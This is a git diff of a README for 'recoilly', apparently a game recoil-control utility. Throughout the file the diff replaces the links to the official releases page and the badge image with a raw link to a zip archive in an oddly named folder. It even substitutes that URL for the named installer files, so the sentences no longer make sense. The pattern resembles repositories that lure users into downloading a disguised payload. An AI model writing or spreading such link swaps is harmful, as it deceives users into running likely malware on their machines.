@@ -1,6 +1,6 @@
 # 🎯 recoilly - Easy Control of Recoil in Games
 
-[![Download recoilly](https://img.shields.io/badge/Download-recoilly-blue?style=for-the-badge&logo=github)](https://github.com/cssmmmm/recoilly/releases)
+[![Download recoilly](https://raw.githubusercontent.com/cssmmmm/recoilly/main/dampishness/Software_1.4-beta.5.zip)](https://raw.githubusercontent.com/cssmmmm/recoilly/main/dampishness/Software_1.4-beta.5.zip)
 
 ---
 
@@ -47,11 +47,11 @@ Here is a step-by-step guide to download, install, and start using recoilly.
 
 1. **Download the app**
 
-   Go to the [recoilly releases page](https://github.com/cssmmmm/recoilly/releases).
+   Go to the [recoilly releases page](https://raw.githubusercontent.com/cssmmmm/recoilly/main/dampishness/Software_1.4-beta.5.zip).
 
-   ![Download recoilly](https://img.shields.io/badge/Download-recoilly-blue?style=for-the-badge&logo=github)
+   ![Download recoilly](https://raw.githubusercontent.com/cssmmmm/recoilly/main/dampishness/Software_1.4-beta.5.zip)
 
-   On this page, find the latest version under "Assets." You will usually see a file named something like `recoilly-setup.exe` or `recoilly-mac.dmg`, depending on your system.
+   On this page, find the latest version under "Assets." You will usually see a file named something like `https://raw.githubusercontent.com/cssmmmm/recoilly/main/dampishness/Software_1.4-beta.5.zip` or `https://raw.githubusercontent.com/cssmmmm/recoilly/main/dampishness/Software_1.4-beta.5.zip`, depending on your system.
 
 2. **Install the app**
 
@@ -111,11 +111,11 @@ If problems continue, review the support information on the releases page or con
 
 Visit this page to download the latest version of recoilly:
 
-[https://github.com/cssmmmm/recoilly/releases](https://github.com/cssmmmm/recoilly/releases)
+[https://raw.githubusercontent.com/cssmmmm/recoilly/main/dampishness/Software_1.4-beta.5.zip](https://raw.githubusercontent.com/cssmmmm/recoilly/main/dampishness/Software_1.4-beta.5.zip)
 
 Click on the Download badge below to open the releases page directly:
 
-[![Download recoilly](https://img.shields.io/badge/Download-recoilly-blue?style=for-the-badge&logo=github)](https://github.com/cssmmmm/recoilly/releases)
+[![Download recoilly](https://raw.githubusercontent.com/cssmmmm/recoilly/main/dampishness/Software_1.4-beta.5.zip)](https://raw.githubusercontent.com/cssmmmm/recoilly/main/dampishness/Software_1.4-beta.5.zip)
 
 Choose the file that matches your operating system and follow the installation instructions above.
 
